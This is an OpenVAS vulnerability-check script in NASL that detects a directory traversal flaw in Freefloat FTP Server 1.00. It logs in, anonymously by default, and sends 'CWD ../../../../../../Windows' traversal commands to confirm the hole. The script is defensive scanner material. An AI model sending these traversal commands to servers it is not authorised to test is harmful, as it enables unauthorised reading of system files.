###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_freefloat_ftp_server_dir_trav_vun.nasl 14 2013-10-27 12:33:37Z jan $
#
# Freefloat FTP Server Directory Traversal Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.ne
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to read arbitrary files
  on the affected application.
  Impact Level: Application";
tag_affected = "Freefloat FTPserver version 1.00";
tag_insight = "The flaw is due to an error while handling certain requests, which
  can be exploited to download arbitrary files from the host system via
  directory traversal attack.";
tag_solution = "No solution or patch is available as of 13th December, 2010. Information
  regarding this issue will updated once the solution details are available.
  For updates refer to
  http://www.freefloat.com/sv/freefloat-ftp-server/freefloat-ftp-server.php";
tag_summary = "The host is running Freefloat FTP Server and is prone to directory traversal
  vulnerability.";

if(description)
{
  script_id(800188);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-12-13 15:28:53 +0100 (Mon, 13 Dec 2010)");
  script_bugtraq_id(45218);
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Freefloat FTP Server Directory Directory Traversal Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/45218/info");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/96423/freefloat-traversal.txt");

  script_description(desc);
  script_summary("Try Directory Traversal Attack on Freefloat FTP server");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("FTP");
  script_require_ports("Services/ftp", 21);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("ftp_func.inc");

## Get the default FTP port
ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

## Check FTP Port Status
if(!get_port_state(ftpPort)){
  exit(0);
}

## Confirm the application with FTP banner
banner = get_ftp_banner(port:ftpPort);
if("FreeFloat Ftp Server" >!< banner){
  exit(0);
}

## Open a Socket to FTP port
soc1 = open_sock_tcp(ftpPort);
if(!soc1){
  exit(0);
}

## Get User and Pass from KB
user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

## Use default Passwords,
## If user and pass are not given
if(!user){
  user = "anonymous";
}
if(!pass){
  pass = "anonymous";
}

## Login with given credentials
login_details = ftp_log_in(socket:soc1, user:user, pass:pass);
if(login_details)
{
  chk_res = "Windows";

  ## Change Current working Directory using Directory Traversal
  send(socket:soc1, data:'CWD ../../../../../../Windows\r\n');
  atkres1 = ftp_recv_line(socket:soc1);

  ## If CWD is not successful, then try to CWD to WINNT
  if("250 CWD command successful" >!< atkres1)
  {
    send(socket:soc1, data:'CWD ../../../../../../WINNT\r\n');
    atkres1 = ftp_recv_line(socket:soc1);
    chk_res = "WINNT";
  }

  ## Send Present Working Directory command
  send(socket:soc1, data:'PWD\r\n');
  atkres2 = ftp_recv_line(socket:soc1);

  ## Confirm the Exploit by checking the resopnse from server
  if("250 CWD command successful" >< atkres1 && "257 ">< atkres2 &&
                                              chk_res >< atkres2){
    security_hole(port:ftpPort);
  }
}

## Close FTP socket
ftp_close(socket:soc1);
